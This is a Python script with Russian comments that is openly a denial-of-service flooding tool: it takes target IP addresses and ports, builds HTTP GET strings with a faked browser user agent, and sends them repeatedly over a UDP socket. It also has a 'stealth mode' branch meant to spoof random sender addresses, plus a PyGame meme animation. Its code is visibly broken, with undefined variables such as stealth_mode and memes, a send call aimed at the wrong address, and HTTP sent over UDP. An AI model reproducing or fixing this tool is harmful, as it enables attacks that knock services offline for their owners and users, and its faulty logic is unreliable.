import socket
import random
import sys
import time

# Инициализация PyGame
import pygame

# Создание сокета для отправки пакетов
ddos_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ddos_socket.settimeout(10)

# Ввод IP-адресов и портов через консоль Termux
ips = []
ports = []
print("Введите IP-адреса и порты (для завершения введите 'stop'):")
while True:
    ip_port = input("IP-адрес и порт (например, 192.168.1.1:80): ")
    if ip_port.lower() == 'stop':
        break
    ip, port = ip_port.split(':')
    ips.append(ip)
    ports.append(int(port))

print("Успешно загружены IP-адреса и порты:")
for ip in ips:
    print(f"{ip}:{ports[ips.index(ip)]}")

# Генерация случайного пользовательского агента
user_agent = f"Mozilla/5.0 (Windows NT {random.randint(10, 11)}.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"

# Настройка PyGame
pygame.init()
window_size = (800, 600)
screen = pygame.display.set_mode(window_size)

# Загрузка изображений для анимации
animation_images = {}
try:
    with open('animations.txt', 'r') as file:
        for line in file:
            if line.strip():
                image_path = line.strip()
                animation_images[image_path] = pygame.image.load(image_path)
except Exception as e:
    print(f"Ошибка при загрузке анимаций: {e}")
    sys.exit(1)

# Настройка анимации
animation_duration = 1000  # Продолжительность анимации в миллисекундах
animation_fps = 30  # Частота кадров анимации

# Количество пакетов, которые могут быть отправлены за раз
burst_size = 10

# Количество отправляемых пакетов
packet_count = 1000

# Частота атаки (в секундах)
frequency = 1

# Время между анимацией (в секундах)
animation_delay = 1

# Инициализация таймера анимации
animation_timer = 0

# Функция для отправки пакетов
def send_packets(socket, packets):
    sent_packets = 0
    failed_packets = 0
    for packet in packets:
        try:
            socket.sendto(packet.encode(), (ip[0], port))
            sent_packets += 1
        except Exception:
            failed_packets += 1
    return sent_packets, failed_packets

# Функция для анимации
def animate(image, pos, duration):
    global animation_timer
    pygame.draw.rect(screen, (255, 255, 255), (0, 0, *window_size))  # Очистка экрана
    screen.blit(image, pos)
    pygame.display.update()
    time.sleep(duration / 1000)
    animation_timer += duration

# Главная функция
if __name__ == "__main__":
    # Определение пакетов
    packets = [f"GET /{random.randint(1, 1000000)} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {user_agent}\r\n\r\n" for _ in range(burst_size)]

    # Счетчики отправленных и не отправленных пакетов
    sent_packets = 0
    failed_packets = 0

    # Инициализация таймера анимации
    animation_timer = 0

    # Цикл отправки пакетов
    while sent_packets < packet_count:
        for ip, port in zip(ips, ports):
            if stealth_mode:
                # Генерация случайного IP для скрытой отправки
                sender_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            else:
                sender_ip = "0.0.0.0"  # Использование "любого" IP для открытой отправки

            sent, failed = send_packets(ddos_socket, packets)
            sent_packets += sent
            failed_packets += failed

            print(f"Отправлено: {sent_packets} / {packet_count}")

            # Анимация
            if animation_timer == 0:
                # Выбор случайного изображения для анимации
                image_path = random.choice(list(animation_images.keys()))
                image = animation_images[image_path]

                # Анимация
                if memes:
                    random_position = (random.randint(0, window_size[0] - image.get_width()), random.randint(0, window_size[1] - image.get_height()))
                    animate(image, random_position, animation_duration)
                else:
                    animate(image, (window_size[0] // 2 - image.get_width() // 2, window_size[1] // 2 - image.get_height() // 2), animation_duration)

            animation_timer = animation_delay

        # Пауза перед следующей итерацией
        time.sleep(frequency)

    # Закрытие сокета
    ddos_socket.close()

    # Окончившаяся атака
    print(f"Атака закончена. Отправлено пакетов: {sent_packets}")

# Закрытие PyGame
pygame.quit()

